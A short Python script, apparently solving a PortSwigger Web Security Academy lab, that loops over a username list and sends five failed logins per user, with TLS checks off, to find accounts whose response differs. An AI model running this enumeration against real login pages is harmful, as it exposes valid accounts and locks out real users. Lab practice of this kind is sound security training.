import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://ac711f571f232380c0d2b587002f007f.web-security-academy.net/login"
page_cookies = {'session': 'tbqHdXfycUYvnb0wJFnzsbvcCx3O23dv'}

users_file = open('users_portswigger.txt', 'r')
users_list = users_file.readlines()
users_file.close()

for user in users_list:
    body = {'username': user.strip(), 'password': '12312312312312312312312312312312312312312312'}

    for i in range(1,6):
        req = requests.post(url, data=body, cookies=page_cookies, verify=False)

        if 'Invalid username or password.' in req.text:
            print(f"{user.strip()}:{req.status_code}:{req.elapsed.microseconds/1000}: Invalid username or password.")
        else:
            print(f"{user.strip()}:{req.status_code}:{req.elapsed.microseconds/1000}: Diferente **")
